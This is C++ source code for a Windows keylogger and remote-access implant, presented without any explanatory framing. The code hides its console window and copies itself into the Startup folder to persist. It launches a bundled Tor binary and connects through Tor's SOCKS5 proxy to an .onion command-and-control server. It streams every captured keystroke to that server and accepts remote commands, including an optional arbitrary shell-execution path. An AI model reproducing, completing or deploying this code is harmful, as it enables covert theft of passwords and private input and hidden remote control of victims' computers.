#include <cstdio>
#include <chrono>
#include <thread>
#include <string>
#include <cstdlib>
#include <fstream>
#include <unistd.h>
#include <tchar.h>
#include <locale.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <filesystem>
#define MSG_NOSIGNAL        0
#define MAX                 65536
#define cnc_onion_server    "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.onion"

HHOOK hHook;

SOCKET fd;

void Log(std::string input) {
    const char *buf = input.c_str();
    send(fd, buf, 2048, 0);
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN) {
            CHAR key[2];
            DWORD vkCode = kbd->vkCode;
            if (vkCode >= 0x30 && vkCode <= 0x39) {
                if (GetAsyncKeyState(VK_SHIFT)) {
                    switch (vkCode) {
                    case 0x30:
                        Log(")");
                        break;
                    case 0x31:
                        Log("!");
                        break;
                    case 0x32:
                        Log("@");
                        break;
                    case 0x33:
                        Log("#");
                        break;
                    case 0x34:
                        Log("$");
                        break;
                    case 0x35:
                        Log("%");
                        break;
                    case 0x36:
                        Log("^");
                        break;
                    case 0x37:
                        Log("&");
                        break;
                    case 0x38:
                        Log("*");
                        break;
                    case 0x39:
                        Log("(");
                        break;
                    }
                }
                else {
                    sprintf_s(key, "%c", vkCode);
                    Log(key);
                }
            }
            else if (vkCode >= 0x41 && vkCode <= 0x5A) {
                if (GetAsyncKeyState(VK_SHIFT) == FALSE)
                    vkCode += 32;
                sprintf_s(key, "%c", vkCode);
                Log(key);
            }
            else {
                switch (vkCode) {
                case VK_OEM_PLUS:
                    GetAsyncKeyState(VK_SHIFT) ? Log("+") : Log("=");
                    break;
                case VK_OEM_COMMA:
                    GetAsyncKeyState(VK_SHIFT) ? Log("<") : Log(",");
                    break;
                case VK_OEM_MINUS:
                    GetAsyncKeyState(VK_SHIFT) ? Log("_") : Log("-");
                    break;
                case VK_OEM_PERIOD:
                    GetAsyncKeyState(VK_SHIFT) ? Log(">") : Log(".");
                    break;
                case VK_OEM_1:
                    GetAsyncKeyState(VK_SHIFT) ? Log(":") : Log(";");
                    break;
                case VK_OEM_2:
                    GetAsyncKeyState(VK_SHIFT) ? Log("?") : Log("/");
                    break;
                case VK_OEM_3:
                    GetAsyncKeyState(VK_SHIFT) ? Log("~") : Log("`");
                    break;
                case VK_OEM_4:
                    GetAsyncKeyState(VK_SHIFT) ? Log("{") : Log("[");
                    break;
                case VK_OEM_5:
                    GetAsyncKeyState(VK_SHIFT) ? Log("|") : Log("\\");
                    break;
                case VK_OEM_6:
                    GetAsyncKeyState(VK_SHIFT) ? Log("}") : Log("]");
                    break;
                case VK_OEM_7:
                    GetAsyncKeyState(VK_SHIFT) ? Log("\"") : Log("'");
                    break;
                case VK_LCONTROL:
                    Log("[LCONTROL]");
                    break;
                case VK_RCONTROL:
                    Log("[RCONTROL]");
                    break;
                case VK_CANCEL:
                    Log("[CANCEL]");
                    break;
                case VK_BACK:
                    Log("[BACKSPACE]");
                    break;
                case VK_TAB:
                    Log("[TAB]");
                    break;
                case VK_CLEAR:
                    Log("[CLEAR]");
                    break;
                case VK_RETURN:
                    Log("[ENTER]\n");
                    break;
                case VK_CONTROL:
                    Log("[CTRL]");
                    break;
                case VK_MENU:
                    Log("[ALT]");
                    break;
                case VK_PAUSE:
                    Log("[PAUSE]");
                    break;
                case VK_CAPITAL:
                    Log("[CAPS LOCK]");
                    break;
                case VK_ESCAPE:
                    Log("[ESC]");
                    break;
                case VK_SPACE:
                    Log("[SPACE]");
                    break;
                case VK_PRIOR:
                    Log("[PAGE UP]");
                    break;
                case VK_NEXT:
                    Log("[PAGE DOWN]");
                    break;
                case VK_END:
                    Log("[END]");
                    break;
                case VK_HOME:
                    Log("[HOME]");
                    break;
                case VK_LEFT:
                    Log("[LEFT ARROW]");
                    break;
                case VK_UP:
                    Log("[UP ARROW]");
                    break;
                case VK_RIGHT:
                    Log("[RIGHT ARROW]");
                    break;
                case VK_DOWN:
                    Log("[DOWN ARROW]");
                    break;
                case VK_INSERT:
                    Log("[INS]");
                    break;
                case VK_DELETE:
                    Log("[DEL]");
                    break;
                case VK_NUMPAD0:
                    Log("[NUMPAD 0]");
                    break;
                case VK_NUMPAD1:
                    Log("[NUMPAD 1]");
                    break;
                case VK_NUMPAD2:
                    Log("[NUMPAD 2]");
                    break;
                case VK_NUMPAD3:
                    Log("[NUMPAD 3");
                    break;
                case VK_NUMPAD4:
                    Log("[NUMPAD 4]");
                    break;
                case VK_NUMPAD5:
                    Log("[NUMPAD 5]");
                    break;
                case VK_NUMPAD6:
                    Log("[NUMPAD 6]");
                    break;
                case VK_NUMPAD7:
                    Log("[NUMPAD 7]");
                    break;
                case VK_NUMPAD8:
                    Log("[NUMPAD 8]");
                    break;
                case VK_NUMPAD9:
                    Log("[NUMPAD 9]");
                    break;
                case VK_MULTIPLY:
                    Log("[*]");
                    break;
                case VK_ADD:
                    Log("[+]");
                    break;
                case VK_SUBTRACT:
                    Log("[-]");
                    break;
                case VK_DECIMAL:
                    Log("[.]");
                    break;
                case VK_DIVIDE:
                    Log("[/]");
                    break;
                case VK_F1:
                    Log("[F1]");
                    break;
                case VK_F2:
                    Log("[F2]");
                    break;
                case VK_F3:
                    Log("[F3]");
                    break;
                case VK_F4:
                    Log("[F4]");
                    break;
                case VK_F5:
                    Log("[F5]");
                    break;
                case VK_F6:
                    Log("[F6]");
                    break;
                case VK_F7:
                    Log("[F7]");
                    break;
                case VK_F8:
                    Log("[F8]");
                    break;
                case VK_F9:
                    Log("[F9]");
                    break;
                case VK_F10:
                    Log("[F10]");
                    break;
                case VK_F11:
                    Log("[F11]");
                    break;
                case VK_F12:
                    Log("[F12]");
                    break;
                case VK_NUMLOCK:
                    Log("[NUM LOCK]");
                    break;
                case VK_SCROLL:
                    Log("[SCROLL LOCK]");
                    break;
                }
            }
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void keylog()
{
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

void start_tor()
{
    FILE *c_03 = popen("C:\\Windows\\Temp\\tor.exe", "r");
    (void)pclose(c_03);
}

int main(int argc, char **argv)
{
    HANDLE hMutex = CreateMutex(NULL, FALSE, _T("test"));
    if (GetLastError() == ERROR_ALREADY_EXISTS || hMutex == NULL) return 1;

    //FreeConsole();
    AllocConsole();
    HWND window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window, 0);

    char buf[256];
    strcpy(buf, argv[0]);
    std::string str = buf;
    if (str.find(".exe") == std::string::npos) {
        str += ".exe";
    }
    std::filesystem::path path = std::filesystem::current_path();
    std::string path_string{path.u8string() + "\\"};
    str.erase(str.find(path_string));
    std::string startup_directory = "%HOMEDRIVE%%HOMEPATH%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
    std::string dir_place_worm = startup_directory + "\\" + str;
    std::string cmd_copy_worm_startup = "xcopy \".\\" + str + "\" \"" + dir_place_worm + "*\" /Y";
    const char *cmd_copy_worm_startup_p = cmd_copy_worm_startup.c_str();
    FILE *c_01 = popen(cmd_copy_worm_startup_p, "r");
    (void)pclose(c_01);
    cmd_copy_worm_startup = "copy tor.exe C:\\Windows\\Temp\\tor.exe /Y";
    const char *cmd_copy_worm_startup_q = cmd_copy_worm_startup.c_str();
    FILE *c_02 = popen(cmd_copy_worm_startup_q, "r");
    (void)pclose(c_02);
    std::string startup_directory_del = "\"%HOMEDRIVE%%HOMEPATH%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
    std::string n = "del " + startup_directory_del + "\\tor.exe\"";
    FILE *c_04 = popen(n.c_str(), "r");
    (void)pclose(c_04);
    std::thread th(start_tor);
    th.join();
    std::this_thread::sleep_for(std::chrono::seconds(90));

    WSADATA wsaData;
    char recv_buf[MAX] = {};
    char send_buf[MAX] = {};

    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) return 1;

    SOCKET      Socket;
    SOCKADDR_IN SocketAddr;

    SocketAddr.sin_family       = AF_INET;
    SocketAddr.sin_port         = htons(9050);
    SocketAddr.sin_addr.s_addr  = inet_addr("127.0.0.1");

    while (1) {
        Socket = socket(AF_INET, SOCK_STREAM, 0);
        fd = Socket;

        if (connect(Socket, (SOCKADDR*)&SocketAddr, sizeof(SOCKADDR_IN))) {
            std::this_thread::sleep_for(std::chrono::seconds(5));
            continue;
        }

        char Req1[3] = {
            0x05, // SOCKS 5
            0x01, // One Authentication Method
            0x00  // No AUthentication
        };
        send(Socket, Req1, 3, MSG_NOSIGNAL);

        char Resp1[2];
        recv(Socket, Resp1, 2, 0);
        if(Resp1[1] != 0x00) {
            continue;
        }

        char Domain[] = cnc_onion_server;
        char  DomainLen = (char)strlen(Domain);
        short Port = htons(80);

        char TmpReq[4] = {
            0x05, // SOCKS5
            0x01, // CONNECT
            0x00, // RESERVED
            0x03, // DOMAIN
        };

        char* Req2 = new char[4 + 1 + DomainLen + 2];

        memcpy(Req2, TmpReq, 4);                // 5, 1, 0, 3
        memcpy(Req2 + 4, &DomainLen, 1);        // Domain Length
        memcpy(Req2 + 5, Domain, DomainLen);    // Domain
        memcpy(Req2 + 5 + DomainLen, &Port, 2); // Port

        send(Socket, (char*)Req2, 4 + 1 + DomainLen + 2, MSG_NOSIGNAL);

        delete[] Req2;

        char Resp2[10];
        recv(Socket, Resp2, 10, 0);
        if(Resp2[1] != 0x00) {
            continue;
        }

        std::filesystem::path path = std::filesystem::current_path();
        std::string path_string{path.u8string()};
        char carry[path_string.size()];
        path_string.copy(carry, path_string.size());

        while (1) {
            recv(Socket, recv_buf, sizeof(recv_buf), 0);
            recv_buf[strcspn(recv_buf, "\r\n")] = 0;

            if (!strcmp(recv_buf, "!q")) break;
            if (!strcmp(recv_buf, "pwd")) {
                strcpy(send_buf, carry);
            }
            else if (!strcmp(recv_buf, "keylogger")) {
                keylog();
            }
#ifdef _TEST_
            FILE *fp;
            if ((fp = popen(recv_buf, "r")) == NULL) {
                perror("can not exec commad");
            }
            while (!feof(fp)) {
                strcat(t, send_buf);
                fgets(send_buf, sizeof(send_buf), fp);
            }
            memcpy(send_buf, t, MAX);
            (void)pclose(fp);
#endif
            send(Socket, send_buf, strlen(send_buf), 0);
            memset(send_buf, 0, MAX*sizeof(send_buf[0]));
            send_buf[MAX] = {0};
        }
    }

    closesocket(Socket);

    WSACleanup();

    return 0;
}
